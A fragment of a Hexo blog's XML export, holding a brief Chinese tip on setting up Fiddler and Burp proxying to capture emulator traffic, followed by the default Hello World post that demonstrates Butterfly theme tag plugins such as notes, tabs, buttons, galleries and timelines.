<h1 id="fiddler开启代理，bp流量监听"><a href="#fiddler开启代理，bp流量监听" class="headerlink" title="fiddler开启代理，bp流量监听"></a>fiddler开启代理，bp流量监听</h1><p>开启fiddler代理，并找到live traffic<br><img src="/img/postimg/simulatorcatche/proxyenable.png"><br>关闭系统代理（system proxy）防止本地流量影响模拟器抓包<br><img src="/img/postimg/simulatorcatche/globalproxy.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Packet Capture</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/posts/4a17b156.html</url>
    <content><![CDATA[<h2 id="文章模板"><a href="#文章模板" class="headerlink" title="文章模板"></a>文章模板</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"># 必须 页面标题</span><br><span class="line">title: sqli-labs</span><br><span class="line"># 必须 文章永久链接 插件生成</span><br><span class="line">abbrlink: d642dfa0</span><br><span class="line"># 创建时间</span><br><span class="line">date: 2024-09-10 22:41:44</span><br><span class="line"># 更新时间</span><br><span class="line">updated:</span><br><span class="line"># 标签</span><br><span class="line">tags: sql注入</span><br><span class="line"># 文章分类</span><br><span class="line">categories: 靶场练习</span><br><span class="line"># 关键字</span><br><span class="line">keywords:</span><br><span class="line"># 文章描述</span><br><span class="line">description: 第 n+1 次尝试通关sql靶场~</span><br><span class="line"># 文章顶部图设置 优先级 &gt; default_top_img</span><br><span class="line">top_img:</span><br><span class="line"># 显示文章评论模块 我没搞文章评论</span><br><span class="line">comments: false</span><br><span class="line"># 文章缩略图 如果没有设置 top_img，文章页顶部将显示缩略图 false/图片地址/留空</span><br><span class="line">cover: false</span><br><span class="line"># 显示文章 toc 即文章目录</span><br><span class="line">toc:</span><br><span class="line"># 显示文字 toc_number</span><br><span class="line">toc_number:</span><br><span class="line"># 显示toc简洁模式</span><br><span class="line">toc_style_simple: true</span><br><span class="line"># 显示文章版权模块 默认设置 post_copyright enable</span><br><span class="line">copyright:</span><br><span class="line"># 文章版权模块的文章作者</span><br><span class="line">copyright_author:</span><br><span class="line"># 文章版权模块的文章作者链接</span><br><span class="line">copyright_author_href:</span><br><span class="line"># 文章版权模块的文章链接</span><br><span class="line">copyright_url:</span><br><span class="line"># 文章版权模块的版权声明文字</span><br><span class="line">copyright_info:</span><br><span class="line"># 系列文章</span><br><span class="line">serious:</span><br><span class="line"># 播放器 加载aplayer的js和css</span><br><span class="line">aplayer:</span><br><span class="line"># 文章代码框是否展开</span><br><span class="line">highlight_shrink:</span><br><span class="line"># 显示侧边栏</span><br><span class="line">aside:</span><br><span class="line"># math显示</span><br><span class="line">mathjax:</span><br><span class="line"># katex显示</span><br><span class="line">katex:</span><br><span class="line"># 加载abcjs</span><br><span class="line">abcjs:</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br><span class="line">this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.this is a long sentence.</span><br></pre></td></tr></table></figure>


<h2 id="标签外挂"><a href="#标签外挂" class="headerlink" title="标签外挂"></a>标签外挂</h2><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><h4 id="tag-plugins"><a href="#tag-plugins" class="headerlink" title="tag plugins"></a>tag plugins</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通用设置</span><br><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: simple</span><br><span class="line">  icons: false</span><br><span class="line">  border_radius: 3</span><br><span class="line">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span><br><span class="line">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span><br><span class="line">  light_bg_offset: 0</span><br><span class="line"></span><br><span class="line">  icons和light_bg_offset只对方法一生效</span><br><span class="line"></span><br><span class="line">用法1</span><br><span class="line">&#123;% note [class] [no-icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">用法2 自定义icon</span><br><span class="line">&#123;% note [color] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h4><div class="note simple"><p>默认 提示块标签</p>
</div>

<div class="note default simple"><p>default 提示块标签</p>
</div>

<div class="note primary simple"><p>primary 提示块标签</p>
</div>

<div class="note success simple"><p>success 提示块标签</p>
</div>

<div class="note info simple"><p>info 提示块标签</p>
</div>

<div class="note warning simple"><p>warning 提示块标签</p>
</div>

<div class="note danger simple"><p>danger 提示块标签</p>
</div>


<h4 id="modern"><a href="#modern" class="headerlink" title="modern"></a>modern</h4><div class="note modern"><p>默认 提示块标签</p>
</div>

<div class="note default modern"><p>default 提示块标签</p>
</div>

<div class="note primary modern"><p>primary 提示块标签</p>
</div>

<div class="note success modern"><p>success 提示块标签</p>
</div>

<div class="note info modern"><p>info 提示块标签</p>
</div>

<div class="note warning modern"><p>warning 提示块标签</p>
</div>

<div class="note danger modern"><p>danger 提示块标签</p>
</div>

<h4 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h4><div class="note flat"><p>默认 提示块标签</p>
</div>

<div class="note default flat"><p>default 提示块标签</p>
</div>

<div class="note primary flat"><p>primary 提示块标签</p>
</div>

<div class="note success flat"><p>success 提示块标签</p>
</div>

<div class="note info flat"><p>info 提示块标签</p>
</div>

<div class="note warning flat"><p>warning 提示块标签</p>
</div>

<div class="note danger flat"><p>danger 提示块标签</p>
</div>

<h4 id="disabled"><a href="#disabled" class="headerlink" title="disabled"></a>disabled</h4><div class="note disabled"><p>默认 提示块标签</p>
</div>

<div class="note default disabled"><p>default 提示块标签</p>
</div>

<div class="note primary disabled"><p>primary 提示块标签</p>
</div>

<div class="note success disabled"><p>success 提示块标签</p>
</div>

<div class="note info disabled"><p>info 提示块标签</p>
</div>

<div class="note warning disabled"><p>warning 提示块标签</p>
</div>

<div class="note danger disabled"><p>danger 提示块标签</p>
</div>

<h4 id="no-icon"><a href="#no-icon" class="headerlink" title="no-icon"></a>no-icon</h4><div class="note no-icon flat"><p>默认 提示块标签</p>
</div>

<div class="note default no-icon flat"><p>default 提示块标签</p>
</div>

<div class="note primary no-icon flat"><p>primary 提示块标签</p>
</div>

<div class="note success no-icon flat"><p>success 提示块标签</p>
</div>

<div class="note info no-icon flat"><p>info 提示块标签</p>
</div>

<div class="note warning no-icon flat"><p>warning 提示块标签</p>
</div>

<div class="note danger no-icon flat"><p>danger 提示块标签</p>
</div>

<h3 id="Gallery相册图库"><a href="#Gallery相册图库" class="headerlink" title="Gallery相册图库"></a>Gallery相册图库</h3><p>图库集合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;gallery-group-main&quot;&gt;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<div>
<div class="gallery-group-main">
<figure class="gallery-group">
  <img class="gallery-group-img no-lightbox" src='/img-url' alt="Group Image Gallery">
  <figcaption>
  <div class="gallery-group-name">name</div>
  <p>description</p>
  <a href='/link'></a>
  </figcaption>
  </figure>
  
<figure class="gallery-group">
  <img class="gallery-group-img no-lightbox" src='/img/icon.png' alt="Group Image Gallery">
  <figcaption>
  <div class="gallery-group-name">测试</div>
  <p>这是描述</p>
  <a href='/img'></a>
  </figcaption>
  </figure>
  
<figure class="gallery-group">
  <img class="gallery-group-img no-lightbox" src='/img-url' alt="Group Image Gallery">
  <figcaption>
  <div class="gallery-group-name">name</div>
  <p>description</p>
  <a href='/link'></a>
  </figcaption>
  </figure>
  
</div>
</div>


<p>name：图库名字<br>description：图库描述<br>link：连接到对应相册的地址<br>img-url：图库封面的地址</p>
<h3 id="Gallery相册"><a href="#Gallery相册" class="headerlink" title="Gallery相册"></a>Gallery相册</h3><p>本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三个参数试了没成功</span><br><span class="line">lazyload	【可选】点击按钮加载更多图片，填写 true/false。默认为 false。</span><br><span class="line">rowHeight	【可选】图片显示的高度，如果需要一行显示更多的图片，可设置更小的数字。默认为 220。</span><br><span class="line">limit	【可选】每次加载多少张照片。默认为 10。</span><br><span class="line"></span><br><span class="line">&#123;% gallery [lazyload],[rowHeight],[limit] %&#125;</span><br><span class="line">markdown 图片格式</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure>
<div class="gallery-container" data-type="data" data-button="">
      <div class="gallery-items">[{"url":"https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg","alt":""},{"url":"https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg","alt":""},{"url":"/img/icon.png","alt":""}]</div>
    </div>

<h3 id="tag-hide"><a href="#tag-hide" class="headerlink" title="tag-hide"></a>tag-hide</h3><h4 id="inline-只可隐藏文字"><a href="#inline-只可隐藏文字" class="headerlink" title="inline  只可隐藏文字"></a>inline  只可隐藏文字</h4><span class="hide-inline"><button type="button" class="hide-button" style="background-color: bg;color: color">display
  </button><span class="hide-content">content</span></span>

<h4 id="block-可隐藏图片代码块等"><a href="#block-可隐藏图片代码块等" class="headerlink" title="block 可隐藏图片代码块等"></a>block 可隐藏图片代码块等</h4><div class="hide-block"><button type="button" class="hide-button" style="background-color: bg;color: color">display
    </button><div class="hide-content"><p>content</p>
</div></div>

<h4 id="toggle-可隐藏收缩框"><a href="#toggle-可隐藏收缩框" class="headerlink" title="toggle 可隐藏收缩框"></a>toggle 可隐藏收缩框</h4><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">display</summary><div class="toggle-content"><p>content</p>
</div></details>


<h3 id="mermaid"><a href="#mermaid" class="headerlink" title="mermaid"></a>mermaid</h3><p>使用mermaid标签可以绘制Flowchart（流程图）、Sequence diagram（时序图 ）、Class Diagram（类别图）、State Diagram（状态图）、Gantt（甘特图）和Pie Chart（圆形图），具体可以查看</p>
<div class="mermaid-wrap"><pre class="mermaid-src" hidden>
  pie
    title 小学生游戏占比
    &quot;a&quot; : 25
    &quot;b&quot; : 25
    &quot;c&quot; : 25
    &quot;d&quot; : 25
  </pre></div>

<h3 id="TABS"><a href="#TABS" class="headerlink" title="TABS"></a>TABS</h3><p>好东西</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line">Unique name   : 选项卡块标记的唯一名称，不带逗号。将在#id中用作每个标签及其索引号的前缀。</span><br><span class="line">                如果名称中有空格，对于generate#id，所有空格都将被破折号替换。只有帖子/页面的当前网址必须是唯一的！</span><br><span class="line">[index]       : 活动选项卡的索引号。如果未指定，将选择第一个选项卡（1）。</span><br><span class="line">                如果索引为-1，则不会选择任何选项卡。它会像扰流板一样。 可选参数。</span><br><span class="line">[Tab caption] : 当前选项卡的标题。如果未指定标题，则具有标签索引后缀的唯一名称将用作标签的标题。</span><br><span class="line">                如果未指定标题，但指定了图标，则标题将为空。  可选参数。</span><br><span class="line">[@icon]       : FontAwesome图标名称（全名，看起来像&#x27;fas-fa-font&#x27;）可以指定有或没有空格；</span><br><span class="line">                例如，类似于“Tab”的“Tab caption@icon”caption@icon&#x27;.  可选参数。</span><br></pre></td></tr></table></figure>
<h4 id="demo-1-预设选择-默认"><a href="#demo-1-预设选择-默认" class="headerlink" title="demo 1 预设选择 默认"></a>demo 1 预设选择 默认</h4><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">test1 1</button><button type="button" class="tab">test1 2</button><button type="button" class="tab">test1 3</button></div><div class="tab-contents"><div class="tab-item-content active"><p><strong>This is Tab 1.</strong></p></div><div class="tab-item-content"><p><strong>This is Tab 2.</strong></p></div><div class="tab-item-content"><p><strong>This is Tab 3.</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>


<h4 id="demo-2-预设选择tabs"><a href="#demo-2-预设选择tabs" class="headerlink" title="demo 2 预设选择tabs"></a>demo 2 预设选择tabs</h4><div class="tabs"><div class="nav-tabs"><button type="button" class="tab">test2 1</button><button type="button" class="tab">test2 2</button><button type="button" class="tab active">test2 3</button></div><div class="tab-contents"><div class="tab-item-content"><p><strong>This is Tab 1.</strong></p></div><div class="tab-item-content"><p><strong>This is Tab 2.</strong></p></div><div class="tab-item-content active"><p><strong>This is Tab 3.</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>


<h4 id="demo-3-无预设值"><a href="#demo-3-无预设值" class="headerlink" title="demo 3 无预设值"></a>demo 3 无预设值</h4><div class="tabs"><div class="nav-tabs no-default"><button type="button" class="tab">test3 1</button><button type="button" class="tab">test3 2</button><button type="button" class="tab">test3 3</button></div><div class="tab-contents"><div class="tab-item-content"><p><strong>This is Tab 1.</strong></p></div><div class="tab-item-content"><p><strong>This is Tab 2.</strong></p></div><div class="tab-item-content"><p><strong>This is Tab 3.</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>

<h4 id="demo-4-自定义"><a href="#demo-4-自定义" class="headerlink" title="demo 4 自定义"></a>demo 4 自定义</h4><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">第一个Tab</button><button type="button" class="tab"><i class="fab fa-apple-pay"></i></button><button type="button" class="tab"><i class="fas fa-bomb"></i>炸弹</button></div><div class="tab-contents"><div class="tab-item-content active"><p><strong>tab名字为第一个Tab</strong></p></div><div class="tab-item-content"><p><strong>只有图标 没有Tab名字</strong></p></div><div class="tab-item-content"><p><strong>名字+icon</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>

<h3 id="button"><a href="#button" class="headerlink" title="button"></a>button</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% btn [url],[text],[icon],[color] [style] [layout] [position] [size] %&#125;</span><br><span class="line"></span><br><span class="line">[url]         : 链接</span><br><span class="line">[text]        : 按钮文字</span><br><span class="line">[icon]        : [可选] 图标</span><br><span class="line">[color]       : [可选] 按钮背景顔色(默认style时）</span><br><span class="line">                      按钮字体和边框顔色(outline时)</span><br><span class="line">                      default/blue/pink/red/purple/orange/green</span><br><span class="line">[style]       : [可选] 按钮样式 默认实心</span><br><span class="line">                      outline/留空</span><br><span class="line">[layout]      : [可选] 按钮佈局 默认为line</span><br><span class="line">                      block/留空</span><br><span class="line">[position]    : [可选] 按钮位置 前提是设置了layout为block 默认为左边</span><br><span class="line">                      center/right/留空</span><br><span class="line">[size]        : [可选] 按钮大小</span><br><span class="line">                      larger/留空</span><br></pre></td></tr></table></figure>
<p>demo<br>This is my website, click the button <a class="btn-beautify " href="https://butterfly.js.org/" 
  title="Butterfly"><span>Butterfly</span></a><br>This is my website, click the button <a class="btn-beautify " href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><br>This is my website, click the button <a class="btn-beautify outline" href="https://butterfly.js.org/" 
  title="Butterfly"><span>Butterfly</span></a><br>This is my website, click the button <a class="btn-beautify outline" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><br>This is my website, click the button <a class="btn-beautify larger" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></p>
<p>对角线</p>
<a class="btn-beautify block" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
<a class="btn-beautify block center larger" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
<a class="btn-beautify block right outline larger" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>

<p>一行多个button</p>
<a class="btn-beautify larger" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
<a class="btn-beautify blue larger" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
<a class="btn-beautify pink larger" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
<a class="btn-beautify red larger" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
<a class="btn-beautify purple larger" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
<a class="btn-beautify orange larger" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
<a class="btn-beautify green larger" href="https://butterfly.js.org/" 
  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>

<h3 id="inlineimg"><a href="#inlineimg" class="headerlink" title="inlineimg"></a>inlineimg</h3><p>主题中的图片默认块级元素显示，若要用内联元素显示可使用inlineimg标签外挂</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% inlineImg [src] [height] %&#125;</span><br><span class="line"></span><br><span class="line">[src]      :    图片链接</span><br><span class="line">[height]   ：   图片高度限制【可选】</span><br></pre></td></tr></table></figure>
<p>demo<br>你看我长得漂亮不</p>
<p><img src="/img/rwby.png"></p>
<p>我觉得很漂亮 <img class="inline-img" src="/img/rwby.png" style="height:150px" /></p>
<h3 id="label"><a href="#label" class="headerlink" title="label"></a>label</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">臣亮言：&#123;% label 先帝 %&#125;创业未半，而&#123;% label 中道崩殂 blue %&#125;。今天下三分，&#123;% label 益州疲敝 pink %&#125;，此诚&#123;% label 危急存亡之秋 red %&#125;也！然侍衞之臣，不懈于内；&#123;% label 忠志之士 purple %&#125;，忘身于外者，盖追先帝之殊遇，欲报之于陛下也。诚宜开张圣听，以光先帝遗德，恢弘志士之气；不宜妄自菲薄，引喻失义，以塞忠谏之路也。</span><br><span class="line">宫中、府中，俱为一体；陟罚臧否，不宜异同。若有&#123;% label 作奸 orange %&#125;、&#123;% label 犯科 green %&#125;，及为忠善者，宜付有司，论其刑赏，以昭陛下平明之治；不宜偏私，使内外异法也。</span><br></pre></td></tr></table></figure>

<p>demo</p>
<p>臣亮言：<mark class="hl-label default">先帝</mark>创业未半，而<mark class="hl-label blue">中道崩殂</mark>。今天下三分，<mark class="hl-label pink">益州疲敝</mark>，此诚<mark class="hl-label red">危急存亡之秋</mark>也！然侍衞之臣，不懈于内；<mark class="hl-label purple">忠志之士</mark>，忘身于外者，盖追先帝之殊遇，欲报之于陛下也。诚宜开张圣听，以光先帝遗德，恢弘志士之气；不宜妄自菲薄，引喻失义，以塞忠谏之路也。<br>宫中、府中，俱为一体；陟罚臧否，不宜异同。若有<mark class="hl-label orange">作奸</mark>、<mark class="hl-label green">犯科</mark>，及为忠善者，宜付有司，论其刑赏，以昭陛下平明之治；不宜偏私，使内外异法也。</p>
<h3 id="timeline"><a href="#timeline" class="headerlink" title="timeline"></a>timeline</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title	标题/时间线</span><br><span class="line">color	timeline 颜色</span><br><span class="line">default(留空) / blue / pink / red / purple / orange / green</span><br><span class="line"></span><br><span class="line">&#123;% timeline title,color %&#125;</span><br><span class="line">&lt;!-- timeline title --&gt;</span><br><span class="line">xxxxx</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline title --&gt;</span><br><span class="line">xxxxx</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure>
<div class="timeline undefined"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-02</p>
</div></div><div class='timeline-item-content'><p>这是测试页面</p>
</div></div></div>

<h3 id="flink"><a href="#flink" class="headerlink" title="flink"></a>flink</h3><p>可在任何界面插入类似友情链接列表效果</p>
<p>内容格式与友情链接界面一样，支持 yml 格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% flink %&#125;</span><br><span class="line">xxxxxx</span><br><span class="line">&#123;% endflink %&#125;</span><br></pre></td></tr></table></figure>
<p>demo</p>
<div class="flink"><div class="flink-name">友情链接</div><div class="flink-desc">那些人，那些事</div> <div class="flink-list">
          <div class="flink-list-item">
            <a href="https://jerryc.me/" title="JerryC" target="_blank">
              <div class="flink-item-icon">
                <img class="no-lightbox" src="https://jerryc.me/img/avatar.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="JerryC" />
              </div>
              <div class="flink-item-name">JerryC</div> 
              <div class="flink-item-desc" title="今日事,今日毕">今日事,今日毕</div>
            </a>
          </div>
          <div class="flink-list-item">
            <a href="https://hexo.io/zh-tw/" title="Hexo" target="_blank">
              <div class="flink-item-icon">
                <img class="no-lightbox" src="https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Hexo" />
              </div>
              <div class="flink-item-name">Hexo</div> 
              <div class="flink-item-desc" title="快速、简单且强大的网志框架">快速、简单且强大的网志框架</div>
            </a>
          </div></div><div class="flink-name">网站</div><div class="flink-desc">值得推荐的网站</div> <div class="flink-list">
          <div class="flink-list-item">
            <a href="https://www.youtube.com/" title="Youtube" target="_blank">
              <div class="flink-item-icon">
                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Youtube" />
              </div>
              <div class="flink-item-name">Youtube</div> 
              <div class="flink-item-desc" title="视频网站">视频网站</div>
            </a>
          </div>
          <div class="flink-list-item">
            <a href="https://www.weibo.com/" title="Weibo" target="_blank">
              <div class="flink-item-icon">
                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Weibo" />
              </div>
              <div class="flink-item-name">Weibo</div> 
              <div class="flink-item-desc" title="中国最大社交分享平台">中国最大社交分享平台</div>
            </a>
          </div>
          <div class="flink-list-item">
            <a href="https://twitter.com/" title="Twitter" target="_blank">
              <div class="flink-item-icon">
                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Twitter" />
              </div>
              <div class="flink-item-name">Twitter</div> 
              <div class="flink-item-desc" title="社交分享平台">社交分享平台</div>
            </a>
          </div></div></div>

<h3 id="abcjs-乐谱"><a href="#abcjs-乐谱" class="headerlink" title="abcjs 乐谱"></a>abcjs 乐谱</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% score %&#125;</span><br><span class="line">乐谱代码</span><br><span class="line">&#123;% endscore %&#125;</span><br></pre></td></tr></table></figure>


<div class="abc-music-sheet">X:1
T:alternate heads
M:C
L:1/8
U:n=!style=normal!
K:C treble style=rhythm
&quot;Am&quot; BBBB B2 B&gt;B | &quot;Dm&quot; B2 B/B/B &quot;C&quot; B4 |&quot;Am&quot; B2 nGnB B2 nGnA | &quot;Dm&quot; nDB/B/ nDB/B/ &quot;C&quot; nCB/B/ nCB/B/ |B8| B0 B0 B0 B0 |]
%%text This translates to:
[M:C][K:style=normal]
